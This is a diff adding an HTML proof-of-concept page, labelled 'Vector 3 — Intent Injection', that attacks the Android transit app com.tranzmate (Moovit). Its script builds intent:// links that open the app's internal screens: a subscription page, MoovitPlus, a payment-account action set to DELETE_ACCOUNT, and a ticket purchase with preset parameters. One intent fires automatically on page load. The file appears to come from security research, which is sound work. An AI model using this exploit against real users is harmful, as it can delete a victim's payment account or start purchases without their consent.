@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#1a1a2e;color:#eee;font-family:monospace;padding:20px">
+<h2 style="color:#e94560">Vector 3 — Intent Injection</h2>
+<pre id="out">Firing intents...</pre>
+<button onclick="fire('subscription')" style="margin:5px;padding:10px">Subscription</button>
+<button onclick="fire('plus')"         style="margin:5px;padding:10px">MoovitPlus</button>
+<button onclick="fire('payment')"      style="margin:5px;padding:10px">Payment (DELETE)</button>
+<button onclick="fire('ticket')"       style="margin:5px;padding:10px">Purchase Ticket</button>
+<script>
+var out = document.getElementById('out');
+function log(m) { out.innerText += m + '\n'; }
+
+var intents = {
+  subscription: 'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.app.account.AccountMySubscriptionActivity;end',
+
+  plus: 'intent://dummy#Intent;scheme=moovit;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.app.plus.MoovitPlusActivity;end',
+
+  payment: 'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.payment.account.actions.PaymentAccountActionActivity;' +
+    'S.action=DELETE_ACCOUNT;end',
+
+  ticket: 'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.ticketing.purchase.PurchaseTicketActivity;' +
+    'S.agencyId=1;S.ticketTypeId=1;end'
+};
+
+function fire(key) {
+  log('[>] Firing: ' + key);
+  window.location = intents[key];
+}
+
+// Auto-fire subscription on load to test the mechanism
+setTimeout(function() { fire('subscription'); }, 1000);
+</script>
+</body>
+</html>
